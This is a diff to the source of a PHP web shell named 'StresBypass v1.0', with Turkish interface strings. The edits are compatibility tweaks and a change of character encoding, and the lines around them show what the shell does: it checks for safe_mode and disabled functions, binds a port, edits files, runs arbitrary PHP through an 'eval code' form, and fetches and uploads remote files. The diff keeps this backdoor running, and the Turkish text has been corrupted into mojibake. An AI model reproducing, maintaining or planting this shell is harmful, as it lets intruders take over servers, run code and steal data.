@@ -1,8 +1,7 @@
-
 <?php
 error_reporting(5);
 @ignore_user_abort(true);
-@set_magic_quotes_runtime(0);
+// @set_magic_quotes_runtime(0);
 $win = 'win' == strtolower(substr(PHP_OS, 0, 3));
 /**********************************************************/
 /*                          StresBypass v1.0
@@ -16,7 +15,8 @@ $win = 'win' == strtolower(substr(PHP_OS, 0, 3));
 /*
 /*********************************************************/
 ?>
-<?$dir=realpath("./")."/";
+<?php
+$dir=realpath("./")."/";
 $dir=str_replace("\\","/",$dir);
 ?>
 
@@ -79,7 +79,7 @@ if (@ini_get('safe_mode') or 'on' == strtolower(@ini_get('safe_mode'))) {
     $hsafemode = '<font color="red">ON (secure)</font>';
 } else {
     $safemode = false;
-    $hsafemode = '<font color="green">Kapalý ( GüvenLik Kapalý )</font>';
+    $hsafemode = '<font color="green">Kapalï¿½ ( Gï¿½venLik Kapalï¿½ )</font>';
 }
 echo "Mod: $hsafemode";
 // PHPINFO
@@ -93,7 +93,7 @@ if ($v or 'on' == strtolower($v)) {
     $hopenbasedir = '<font color="red">' . $v . '</font>';
 } else {
     $openbasedir = false;
-    $hopenbasedir = '<font color="green">Kapalý ( GüvenLik Kapalý )</font>';
+    $hopenbasedir = '<font color="green">Kapalï¿½ ( Gï¿½venLik Kapalï¿½ )</font>';
 }
 echo '<br>';
 echo "Open base dir: $hopenbasedir";
@@ -101,25 +101,25 @@ echo '<br>';
 echo 'PostgreSQL: <b>';
 $pg_on = @function_exists('pg_connect');
 if ($pg_on) {
-    echo '<font color=green>Açýk</font></b>';
+    echo '<font color=green>Aï¿½ï¿½k</font></b>';
 } else {
-    echo '<font color=red>Kapalý</font></b>';
+    echo '<font color=red>Kapalï¿½</font></b>';
 }
 echo '<br>';
 echo 'MSSQL: <b>';
 $mssql_on = @function_exists('mssql_connect');
 if ($mssql_on) {
-    echo '<font color=green>Açýk</font></b>';
+    echo '<font color=green>Aï¿½ï¿½k</font></b>';
 } else {
-    echo '<font color=red>Kapalý</font></b>';
+    echo '<font color=red>Kapalï¿½</font></b>';
 }
 echo '<br>';
 echo 'MySQL: <b>';
 $mysql_on = @function_exists('mysql_connect');
 if ($mysql_on) {
-    echo '<font color=green>Açýk</font></b>';
+    echo '<font color=green>Aï¿½ï¿½k</font></b>';
 } else {
-    echo '<font color=red>Kapalý</font></b>';
+    echo '<font color=red>Kapalï¿½</font></b>';
 }
 echo '<br>';
 echo 'PHP version: <b>' . @phpversion() . '</b>';
@@ -129,7 +129,7 @@ echo 'cURL: ' . (($curl_on) ? ('<b><font color=green>ON</font></b>') : ('<b><fon
 echo '<br>';
 echo 'Disable functions : <b>';
 if ('' == ($df = @ini_get('disable_functions'))) {
-    echo '<font color=green>Hiç</font></b>';
+    echo '<font color=green>Hiï¿½</font></b>';
 } else {
     echo "<font color=red>$df</font></b>";
 }
@@ -285,7 +285,7 @@ if ('bindport' == $act) {
 }
 if ('tools' == $act) {
     echo "<div><FORM method=\"POST\" action=\"$REQUEST_URI\">
-Dosya Düzenle:
+Dosya Dï¿½zenle:
 <input type=\"text\" name=\"editfile\" >
 <INPUT type=\"hidden\" name=\"dir\" value=\"" . getcwd() . '">
 <INPUT type="submit" value="Edit"></form></div>';
@@ -294,7 +294,7 @@ Dosya Düzenle:
 <INPUT type=\"hidden\" name=\"php\" value=\"yes\">
 <INPUT type=\"submit\" value=\"eval code\" id=input></form></div></td></table>";
     echo "<div><FORM method=\"POST\" action=\"$REQUEST_URI\" enctype=\"multipart/form-data\">
-<table id=tb><tr><td>Buradan Ýndir:</b>:
+<table id=tb><tr><td>Buradan ï¿½ndir:</b>:
 <INPUT type=\"text\" name=\"filefrom\" size=30 value=\"http://\">
 <b>-->>:</b>
 <INPUT type=\"text\" name=\"fileto\" size=30>
@@ -869,7 +869,7 @@ if ('edit' == $act) {
     <p> </p>
     <p>    <?php
     echo "<div><FORM method=\"POST\" action=\"$REQUEST_URI\">
-Dosya Düzenle:
+Dosya Dï¿½zenle:
 <input type=\"text\" name=\"editfile\" >
 <INPUT type=\"hidden\" name=\"dir\" value=\"" . getcwd() . '">
 <INPUT type="submit" value="Edit"></form></div>';
@@ -898,7 +898,7 @@ if ('upload' == $act) {
 </table>    </a><p><br></p><TABLE style="BORDER-COLLAPSE: collapse" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=0 width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr>
     <td width="990" height="1" valign="top" style="color: #DCE7EF" bgcolor="#000000"><p align="center">
     <b>
-     </b><font face="Wingdings 3" size="5">y</font><b>StresBypass<span lang="en-us">v1.0</span> <span lang="en-us">pro</span>  </b><font color="#CC0000"><b>©oded by</b> </font><b><span lang="en-us"><a href="http://www.biyosecurity.com">BiyoSecurity.Com</a></span> |<span lang="en-us">By Stres</span> </b><font face="Wingdings 3" size="5">x</font></p><p align="center"> </p></td></tr></table>
+     </b><font face="Wingdings 3" size="5">y</font><b>StresBypass<span lang="en-us">v1.0</span> <span lang="en-us">pro</span>  </b><font color="#CC0000"><b>ï¿½oded by</b> </font><b><span lang="en-us"><a href="http://www.biyosecurity.com">BiyoSecurity.Com</a></span> |<span lang="en-us">By Stres</span> </b><font face="Wingdings 3" size="5">x</font></p><p align="center"> </p></td></tr></table>
 
 </a>
 
